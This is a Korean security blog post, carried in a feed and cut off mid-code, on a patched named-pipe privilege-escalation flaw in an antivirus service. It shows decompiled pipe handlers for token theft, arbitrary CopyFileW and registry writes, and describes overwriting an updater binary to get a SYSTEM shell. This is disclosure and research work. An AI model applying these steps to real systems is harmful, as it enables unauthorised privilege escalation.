      <content:encoded><![CDATA[<p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/logo_window.png" alt></p><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><hr><p>&#xB2E4;&#xB4E4; &#xC0C8;&#xD574; &#xC798; &#xBCF4;&#xB0B4;&#xC168;&#xC744;&#xAE4C;&#xC694;! &#xC800;&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xC5F0;&#xAD6C;&#xAE00;&#xC774;&#xC790; &#xB9C9;&#xB0B4;&#xC988;&#xC758; Part 2 &#xAE00;&#xC744; &#xB9E1;&#xAC8C; &#xB41C; gongjae &#xC785;&#xB2C8;&#xB2E4; &#x1F600; &#xC55E;&#xC11C; banda&#xB2D8;&#xC774; <a href="https://hackyboiz.github.io/2025/12/28/banda/WHS3-bughunting/ko/">Part 1</a>&#xC744; &#xC57C;&#xBB34;&#xC9C0;&#xAC8C; &#xC368;&#xC8FC;&#xC2E0; &#xB098;&#xBA38;&#xC9C0; &#xC81C;&#xAC00; &#xC124;&#xBA85;&#xD560; &#xAC8C; &#xB0A8;&#xC544;&#xC788;&#xC744;&#xAE4C; &#xD558;&#xC9C0;&#xB9CC;&#x2026; &#xADF8;&#xB798;&#xB3C4; &#xC9C1;&#xC811; &#xCC3E;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD55C; &#xC124;&#xBA85;&#xACFC; &#xD568;&#xAED8; &#xBC84;&#xADF8;&#xD5CC;&#xD305;&#xC5D0; &#xAD00;&#xC2EC; &#xC788;&#xC73C;&#xC2E0; &#xBD84;&#xB4E4;&#xC5D0;&#xAC8C; &#xC870;&#xAE08;&#xC774;&#xB098;&#xB9C8; &#xB3C4;&#xC6C0;&#xC774; &#xB418;&#xACE0; &#xC2F6;&#xB124;&#xC694;..&#x314E;&#x314E;</p><p>&#xC624;&#xB298;&#xC740; &#xC81C;&#xAC00; Part 2&#xC5D0;&#xC11C; &#xC9C1;&#xC811; &#xCC3E;&#xC740; Named Pipe&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xB294; LPE &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA70; &#x2018;&#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C;&#xB3C4; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAD6C;&#xB098;&#x2019;&#xB97C; &#xC18C;&#xAC1C;&#xD558;&#xACE0;&#xC790; &#xD569;&#xB2C8;&#xB2E4;!</p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><hr><p>&#xC790;, &#xC6B0;&#xC120; &#xC81C;&#xAC00; &#xCC3E;&#xC740; &#xCDE8;&#xC57D;&#xC810;&#xC740; &#xC548;&#xD2F0;&#xBC14;&#xC774;&#xB7EC;&#xC2A4; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC5D0;&#xC11C; &#xBC1C;&#xC0DD;&#xD55C; Named Pipe &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;, &#xD604;&#xC7AC;&#xB294; &#xD328;&#xCE58;&#xB41C; &#xC0C1;&#xD669;&#xC774;&#xACE0; ZDI&#xC5D0; &#xC81C;&#xBCF4;&#xD558;&#xC5EC; CVE&#xAE4C;&#xC9C0; &#xBC1C;&#xAE09;&#xC774; &#xB41C; &#xC0C1;&#xD0DC;&#xC785;&#xB2C8;&#xB2E4;!</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image1.png" alt></p><p>&#xADF8; &#xC911;&#xC5D0;&#xC11C; &#xC624;&#xB298; &#xC81C;&#xAC00; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9B4; &#xCDE8;&#xC57D;&#xC810;&#xC740; File &#xAD00;&#xB828;, Registry &#xAD00;&#xB828;, Service &#xAD00;&#xB828;&#xC73C;&#xB85C; &#xB098;&#xB258;&#xC5B4; &#xC788;&#xB294;&#xB370;&#xC694;! Named Pipe&#xB97C; &#xACFC;&#xB3C4;&#xD558;&#xAC8C; &#xAC1C;&#xBC29;&#xB41C; &#xC0C1;&#xD0DC;&#xB85C; IPC&#xB97C; &#xC81C;&#xACF5;&#xD558;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB418;&#xB294;&#xC9C0;, Case &#xBCC4;&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;!</p><h2 id="0-Attack-Surface"><a href="#0-Attack-Surface" class="headerlink" title="0. Attack Surface"></a>0. Attack Surface</h2><hr><p>&#xC774; &#xCDE8;&#xC57D;&#xC810;&#xB4E4;&#xC744; &#xC18C;&#xAC1C;&#xD558;&#xAE30; &#xC804;&#xC5D0;, &#xAC00;&#xC7A5; &#xBA3C;&#xC800; &#xD655;&#xC778;&#xD574;&#xC57C; &#xD560; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;. Everyone &#xAD8C;&#xD55C;&#xC774; System &#xC218;&#xC900;&#xC758; &#xAD8C;&#xD55C;&#xC744; &#xC5BB;&#xAE30; &#xC704;&#xD55C; &#xCCAB; &#xAC78;&#xC74C;&#xC774;&#xB77C;&#xACE0; &#xD560; &#xC218; &#xC788;&#xC8E0;! Part 1 &#xB54C;&#xC640; &#xAC70;&#xC758; &#xC720;&#xC0AC;&#xD558;&#xC9C0;&#xB9CC;! <del>&#xADF8;&#xB798;&#xB3C4; &#xBCF4;&#xC5EC;&#xB4DC;&#xB9AC;&#xB294; &#xAC83;&#xC774; &#xC778;&#xC9C0;&#xC0C1;&#xC815;</del> &#xADF8;&#xB798;&#xB3C4; &#xAC19;&#xC774; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image2.png" alt></p><p>&#xD0C0;&#xAC9F; &#xD504;&#xB85C;&#xADF8;&#xB7A8;&#xC744; &#xC124;&#xCE58;&#xD588;&#xC744; &#xB54C; Process Explorer&#xB97C; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xBA74;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; SASCore64.exe &#xB77C;&#xB294; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589;&#xB418;&#xB294; Process&#xAC00; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;! &#xAC70;&#xAE30;&#xB2E4; Handles &#xBD80;&#xBD84;&#xC5D0; Named Pipe &#xAC00; &#xC788;&#xB2E4;&#xB294; &#xAC83; &#xAE4C;&#xC9C0; &#xD655;&#xC778;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image3.png" alt></p><p>&#xAC70;&#xAE30;&#xB2E4; &#xAC00;&#xC7A5; &#xD070; &#xAD00;&#xBB38;&#xC778; ACL &#xBD80;&#xBD84;&#xC774;&#xC8E0;..!! SysinternalsSuite&#xC758; accesschk&#xB97C; &#xC0AC;&#xC6A9;&#xD574; &#xAD8C;&#xD55C;&#xC744; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xB2C8; Everyone RW &#xAD8C;&#xD55C;&#xC774; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;~ &#xB530;&#xB77C;&#xC11C; medium user&#xAC00; &#xD2B9;&#xBCC4;&#xD55C; &#xAD8C;&#xD55C; &#xC5C6;&#xC774;&#xB3C4; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC2E4;&#xD589; &#xC911;&#xC778; &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC5D0; &#xC811;&#xADFC;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC758;&#xBBF8;&#xACA0;&#xC8E0;!</p><p>&#xC790; &#xADF8;&#xB807;&#xB2E4;&#xBA74; &#xC774;&#xC81C; &#xC9C1;&#xC811; SASCore64.exe &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xCD94;&#xCD9C;&#xD558;&#xC5EC; IDA&#xB85C; &#xC5F4;&#xC5B4;&#xBCF8; &#xB4A4;, Imports&#xC5D0;&#xC11C; Named Pipe &#xAD00;&#xB828; api&#xAC00; &#xC788;&#xB294;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image4.png" alt></p><p>CreateNamedPipe api&#xAC00; &#xC788;&#xB294; sub_140013F60 &#xD568;&#xC218;&#xB85C; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image5.png" alt></p><p>&#xCF54;&#xB4DC;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xBA74; CreateNamedPipeA &#xB97C; &#xD1B5;&#xD574; named pipe&#xB97C; &#xB9CC;&#xB4E4;&#xACE0;, Connect &#xD558;&#xB294; &#xAC78; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5EC;&#xAE30;&#xC11C; &#xD575;&#xC2EC;&#xC740; Named Pipe&#xC6A9; SECURITY_ATTRIBUTES &#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB294;&#xB370;, &#xBAA8;&#xB4E0; &#xB85C;&#xCEEC; &#xC0AC;&#xC6A9;&#xC790; &#xC644;&#xC804; &#xC811;&#xADFC;&#xC774; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xAC83;&#xC774;&#xC8E0;! StartAddress &#xD568;&#xC218;&#xB85C; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image6.png" alt></p><p>StartAddress &#xD568;&#xC218;&#xB294; &#xD074;&#xB77C;&#xC774;&#xC5B8;&#xD2B8; 1&#xAC1C;&#xB2F9; Named Pipe &#xC138;&#xC158;&#xC744; &#xCC98;&#xB9AC;&#xD558;&#xB294; &#xC804;&#xC6A9; &#xC2A4;&#xB808;&#xB4DC;&#xB85C;, sub_14000F7E0 &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xD30C;&#xC774;&#xD504; &#xBA54;&#xC2DC;&#xC9C0;&#xB97C; &#xD574;&#xC11D;&#xD558;&#xC5EC; &#xC218;&#xD589;&#xD558;&#xACE0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; sub_14000F7E0 &#xB85C; &#xAC00;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image7.png" alt></p><p>v6&#xC5D0; &#xC6B0;&#xB9AC;&#xC758; input &#xAC12;&#xC744; &#xB123;&#xC744; &#xC218; &#xC788;&#xACE0;, &#xC774;&#xB97C; case&#xB85C; &#xB098;&#xB258;&#xC5B4;&#xC11C; &#xC5EC;&#xB7EC; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! &#xADF8;&#xB7EC;&#xB098; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xC544;&#xB798; 0x103A &#xBD84;&#xAE30;&#xB97C; &#xD1B5;&#xD558;&#xC5EC; Token&#xC744; &#xBA3C;&#xC800; &#xD68D;&#xB4DD;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x103A</span>:{  <span class="hljs-comment">// ... (&#xC785;&#xB825;/&#xC2DC;&#xAC04; &#xAC80;&#xC99D; &#xBC0F; &#xAE30;&#xD0C0; &#xBD80;&#xC218; &#xB85C;&#xC9C1;)</span>  <span class="hljs-keyword">if</span> (ImpersonateNamedPipeClient(a3))  {    <span class="hljs-comment">// ... (TLS&#xC5D0; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xCEE8;&#xD14D;&#xC2A4;&#xD2B8; &#xC800;&#xC7A5; &#xB4F1;)</span>    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *(DWORD *)(input + <span class="hljs-number">8</span>));    <span class="hljs-keyword">if</span> (hProc)    {      HANDLE hToken = <span class="hljs-literal">NULL</span>;      <span class="hljs-keyword">if</span> (OpenProcessToken(hProc, TOKEN_ALL_ACCESS, &amp;hToken) &amp;&amp; hToken)      {        <span class="hljs-comment">// ... (&#xD1A0;&#xD070;&#xC744; &#xB0B4;&#xBD80; &#xC138;&#xC158;/&#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xC800;&#xC7A5;)</span>        CloseHandle(hToken);      }      CloseHandle(hProc);    }    RevertToSelf();    FileSize = <span class="hljs-number">1</span>; <span class="hljs-comment">// session established</span>  }  <span class="hljs-comment">// ... (&#xC751;&#xB2F5; &#xAD6C;&#xC131;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><ul><li>ImpersonateNamedPipeClient, OpenProcessToken(&#x2026;Pid&#x2026;) &#xC131;&#xACF5; &#xC2DC; &#xB0B4;&#xBD80; &#xB9AC;&#xC2A4;&#xD2B8;(a1 + 0x68)&#xC5D0; &#xC0C8; <strong>&#xB178;&#xB4DC; + &#xD1A0;&#xD070;</strong> &#xC774; &#xC800;&#xC7A5;&#xB429;&#xB2C8;&#xB2E4;.</li><li>&#xC751;&#xB2F5; 0x10018 &#xBC14;&#xC774;&#xD2B8; &#xC911; &#xC624;&#xD504;&#xC14B; 0x04 &#xC5D0; &#xD1A0;&#xD070; &#xAC12;&#xC744; &#xB3CC;&#xB824;&#xC8FC;&#xBBC0;&#xB85C; &#xC774; Token&#xC744; &#xC800;&#xC7A5;&#xD558;&#xC5EC; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xAC8C;&#xB429;&#xB2C8;&#xB2E4;.</li></ul><p>&#xC774;&#xB7F0; &#xBC29;&#xC2DD;&#xC73C;&#xB85C; &#xD1A0;&#xD070;&#xC744; &#xC5BB;&#xC740; &#xD6C4;&#xC5D0; &#xB2E4;&#xB978; &#xAE30;&#xB2A5;&#xB4E4;&#xC744; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;, &#xC774; &#xAE30;&#xB2A5;&#xB4E4;&#xC774; &#xBC14;&#xB85C; &#xC81C;&#xAC00; &#xB9D0;&#xC500;&#xB4DC;&#xB9B4; &#xCDE8;&#xC57D;&#xC810; &#xBCA1;&#xD130;&#xC785;&#xB2C8;&#xB2E4;.</p><h2 id="1-File-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE"><a href="#1-File-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE" class="headerlink" title="1. File &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE"></a>1. File &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE</h2><hr><p>&#xBA3C;&#xC800; File &#xAD00;&#xB828; API&#xB4E4;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xBA3C;&#xC800; &#xC54C;&#xC544;&#xBCFC;&#xAE4C;&#xC694;? Windows&#xC5D0;&#xB294; &#xC5EC;&#xB7EC;&#xAC00;&#xC9C0; API&#xB4E4;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xACE0;, &#xB300;&#xBD80;&#xBD84;&#xC740; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xC0AC;&#xC6A9;&#xD560; &#xC218; &#xC788;&#xB3C4;&#xB85D; &#xAC80;&#xC99D;&#xC744; &#xD569;&#xB2C8;&#xB2E4;. &#xC911;&#xC694;&#xD55C; &#xBD80;&#xBD84;&#xC740; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xAC74;&#xB4E4;&#xC9C0; &#xBABB;&#xD558;&#xB3C4;&#xB85D; &#xB9D0;&#xC774;&#xC8E0;.. &#xD558;&#xC9C0;&#xB9CC; &#xB9CC;&#xC57D; &#xC0AC;&#xC6A9;&#xC790;&#xAC00; &#xC911;&#xC694;&#xD55C; &#xC778;&#xC790;&#xB97C; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? </p><h3 id="1-1-CopyFileW"><a href="#1-1-CopyFileW" class="headerlink" title="1-1. CopyFileW()"></a>1-1. CopyFileW()</h3><p>MS&#xC5D0;&#xC11C; <code>CopyFileW()</code> &#xD568;&#xC218;&#xB97C; &#xBCF4;&#xBA74;, &#xAE30;&#xC874; &#xD30C;&#xC77C;&#xC744; &#xC0C8;&#xB85C;&#xC6B4; &#xD30C;&#xC77C;&#xB85C; &#xBCF5;&#xC0AC;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-function">BOOL <span class="hljs-title">CopyFileW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCWSTR lpExistingFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] LPCWSTR lpNewFileName,</span></span><span class="hljs-function"><span class="hljs-params">  [in] BOOL    bFailIfExists</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p>&#xADF8;&#xB807;&#xB2E4;&#xBA74;, System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xD30C;&#xC77C;&#xC744; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xAD8C;&#xD55C; &#xC0C1;&#xC2B9;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C0;&#xACA0;&#xC8E0;?</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x100D</span>:{  <span class="hljs-comment">// ...</span>  BOOL ok = CopyFileW(      (LPCWSTR)(input + <span class="hljs-number">8</span>),       <span class="hljs-comment">// attacker-controlled: src</span>      (LPCWSTR)(input + <span class="hljs-number">0x1048</span>),  <span class="hljs-comment">// attacker-controlled: dst</span>      *(DWORD *)(input + <span class="hljs-number">0x2088</span>)  <span class="hljs-comment">// attacker-controlled: bFailIfExists</span>  );  DWORD err = GetLastError();  <span class="hljs-comment">// ... (&#xC751;&#xB2F5; Buffer&#xC5D0; ok/err &#xB2F4;&#xC544;&#xC11C; &#xBC18;&#xD658;)</span>  WriteFile(a3, Buffer, <span class="hljs-number">0x10018</span>u, &amp;written, <span class="hljs-number">0</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;}</code></pre><p>Token&#xC744; &#xC5BB;&#xC740; &#xB4A4; case 0x100D &#xB85C; &#xBD84;&#xAE30;&#xD558;&#xBA74; input+8&#xC5D0; Copy&#xD560; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C;, &#xB36E;&#xC5B4; &#xC4F8; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xB97C; input+0x1048 &#xC5D0; &#xB123;&#xC5B4; API&#xB97C; &#xD638;&#xCD9C; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image8.png" alt></p><p>&#xC774;&#xAC8C; &#xC65C; LPE&#xB0D0;&#xAD6C;&#xC694;..? &#xC800;&#xD76C;&#xAC00; &#xC77C;&#xBC18;&#xC801;&#xC778; &#xAD8C;&#xD55C;&#xC73C;&#xB85C;&#xB294; &#xBC14;&#xAFB8;&#xAC70;&#xB098; &#xC0AD;&#xC81C;&#xD560; &#xC218; &#xC5C6;&#xB294; &#xD30C;&#xC77C;&#xB4E4;&#xC774; &#xC788;&#xC8E0;. &#xAC70;&#xAE30;&#xB2E4;&#xAC00; &#xBA87; &#xCD08;&#xB9C8;&#xB2E4; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xD30C;&#xC77C;&#xC774; &#xC788;&#xB2E4;&#xBA74;? &#xC774; &#xD30C;&#xC77C;&#xC744; System &#xAD8C;&#xD55C;&#xC73C;&#xB85C; cmd&#xB97C; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xB294; &#xC545;&#xC131;&#xD30C;&#xC77C;&#xB85C; &#xBC14;&#xAFBC;&#xB2E4;&#xBA74; &#xB9D0;&#xADF8;&#xB300;&#xB85C; &#xBA87; &#xCD08;&#xB9C8;&#xB2E4; System &#xAD8C;&#xD55C; cmd&#xAC00; &#xCF1C;&#xC9C0;&#xACA0;&#xC8E0;!! &#xADF8;&#xB7F0; &#xC6D0;&#xB9AC;&#xC785;&#xB2C8;&#xB2E4;.&#x1F47D;</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image9.png" alt></p><p>&#xC774;&#xB807;&#xAC8C; &#xC9C1;&#xC811; Process Monitor&#xB85C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;? &#xC774;&#xAC74; Chrome updater &#xD504;&#xB85C;&#xC138;&#xC2A4;&#xC774;&#xACE0;, &#xBA87; &#xCD08;&#xB9C8;&#xB2E4; &#xC2E4;&#xD589;&#xB418;&#xACE0;, &#xAD8C;&#xD55C;&#xC774; &#xB192;&#xC544; &#xC77C;&#xBC18; &#xAD8C;&#xD55C;&#xC73C;&#xB85C;&#xB294; &#xC811;&#xADFC;&#xC774; &#xBD88;&#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; &#xC704; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD574; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xB85C; &#xBC14;&#xAFBC;&#xB2E4;&#xBA74;!?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image10.png" alt></p><p>&#xC774;&#xB7F0;&#xC2DD;&#xC73C;&#xB85C; System cmd&#xAC00; &#xCF1C;&#xC9C0;&#xB294; &#xAC78; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xC8E0;! &#x1F44F;</p><p>&#xB3D9;&#xC801; &#xBD84;&#xC11D;&#xC744; &#xD1B5;&#xD574; &#xC870;&#xAE08; &#xB354; &#xD655;&#xC2E4;&#xD558;&#xAC8C; &#xD655;&#xC778;&#xD574;&#xBCFC;&#xAE4C;&#xC694;?</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image11.png" alt></p><p>Windbg&#xB85C; &#xD574;&#xB2F9; Process&#xC5D0; Attach&#xB97C; &#xD55C; &#xD6C4; lm &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; base &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD558;&#xACE0;, IDA&#xC5D0;&#xC11C; base &#xC124;&#xC815;&#xC744; &#xD1B5;&#xD574; CopyFileW() &#xD568;&#xC218; &#xBD80;&#xADFC;&#xC5D0; bp&#xB97C; &#xAC78;&#xACE0; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image12.png" alt></p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image13.png" alt></p><p>&#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; Dst &#xC5D0;&#xB294; &#xC55E;&#xC11C; &#xB9D0;&#xD55C; updater &#xACBD;&#xB85C;&#xAC00; &#xC368;&#xC838; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="/2026/01/18/gongjae/WHS3-bughunting2/KR/image14.png" alt></p><p>&#xADF8;&#xB9AC;&#xACE0; Src&#xC5D0;&#xB294; &#xBCF5;&#xC0AC;&#xD560; &#xD30C;&#xC77C; &#xACBD;&#xB85C;&#xAC00; &#xADF8;&#xB300;&#xB85C; &#xB4E4;&#xC5B4;&#xAC00; &#xC788;&#xB294; &#xAC83;&#xC744; &#xD655;&#xC778; &#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xAC00;&#xC9DC; updater.exe &#xB294; System &#xD1A0;&#xD070;&#xC73C;&#xB85C; cmd&#xB97C; &#xCF1C;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xC545;&#xC131; &#xD30C;&#xC77C;&#xC774;&#xACE0;, &#xC774;&#xB807;&#xAC8C; &#xBCF5;&#xC0AC;&#xAC00; &#xB418;&#xBA74;&#xC11C; LPE&#xC5D0; &#xC131;&#xACF5;&#xD558;&#xAC8C; &#xB418;&#xB294;&#xAC83;&#xC774;&#xC8E0;!</p><h2 id="2-Registry-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE"><a href="#2-Registry-&#xAD00;&#xB828;-API&#xB97C;-&#xD65C;&#xC6A9;&#xD55C;-LPE" class="headerlink" title="2. Registry &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE"></a>2. Registry &#xAD00;&#xB828; API&#xB97C; &#xD65C;&#xC6A9;&#xD55C; LPE</h2><hr><p>&#xC790;, &#xB2E4;&#xC74C;&#xC740; Registry &#xAD00;&#xB828; API&#xB4E4;&#xC744; &#xC0B4;&#xD3B4;&#xBCFC;&#xAE4C;&#xC694;! </p><h3 id="2-1-SHSetValueW"><a href="#2-1-SHSetValueW" class="headerlink" title="2-1. SHSetValueW()"></a>2-1. SHSetValueW()</h3><pre><code class="hljs cpp"><span class="hljs-function">LSTATUS <span class="hljs-title">SHSetValueW</span><span class="hljs-params">(</span></span><span class="hljs-function"><span class="hljs-params">  [in]           HKEY    hkey,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR pszSubKey,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCWSTR pszValue,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   dwType,</span></span><span class="hljs-function"><span class="hljs-params">  [in, optional] LPCVOID pvData,</span></span><span class="hljs-function"><span class="hljs-params">  [in]           DWORD   cbData</span></span><span class="hljs-function"><span class="hljs-params">)</span></span>;</code></pre><p><code>SHSetValueW()</code> &#xD568;&#xC218;&#xB294; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC; &#xD0A4;&#xC758; &#xAC12;&#xC744; &#xC124;&#xC815;&#xD558;&#xB294; &#xAE30;&#xB2A5;&#xC744; &#xD558;&#xB294;&#xB370;&#xC694;, &#xC774; &#xC778;&#xC790; &#xC138;&#xD305;&#xC744; &#xBCF4;&#xBA74; SubKey&#xC640; ValueName &#xC744; &#xC124;&#xC815;&#xD574;&#xC904; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774;&#xAC8C; &#xBB34;&#xC2A8; &#xB9D0;&#xC774;&#xB0D0;, &#xC774; &#xC778;&#xC790;&#xB4E4;&#xC744; &#xC870;&#xC791;&#xD560; &#xC218; &#xC788;&#xB2E4;&#xBA74; &#xC6D0;&#xD558;&#xB294; &#xACBD;&#xB85C;&#xC758; &#xB808;&#xC9C0;&#xC2A4;&#xD2B8;&#xB9AC;&#xC758; Value &#xAC12;&#xC744; &#xB9C8;&#xC74C;&#xB300;&#xB85C; &#xBC14;&#xAFC0; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xB73B;&#xC774;&#xACA0;&#xC8E0;!! &#xC9C1;&#xC811; &#xCF54;&#xB4DC;&#xB97C; &#xD1B5;&#xD574; &#xD655;&#xC778;&#xD574;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">case</span> <span class="hljs-number">0x102C</span>:{  <span class="hljs-keyword">const</span> WCHAR *SubKey    = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">16</span>);    <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-keyword">const</span> WCHAR *ValueName = (<span class="hljs-keyword">const</span> WCHAR *)(input + <span class="hljs-number">4176</span>);  <span class="hljs-comment">// attacker-controlled</span>  HKEY RootKey           = *(HKEY *)(input + <span class="hljs-number">8</span>);           <span class="hljs-comment">// attacker-controlled</span>  DWORD Type             = *(DWORD *)(input + <span class="hljs-number">0xA094</span>);     <span class="hljs-comment">// attacker-controlled</span>  LPCVOID Data           = (LPCVOID)(input + <span class="hljs-number">0x2090</span>);      <span class="hljs-comment">// attacker-controlled</span>  DWORD DataSize         = *(DWORD *)(input + <span class="hljs-number">0xA090</span>);     <span class="hljs-comment">// attacker-controlled</span>  <span class="hljs-comment">// 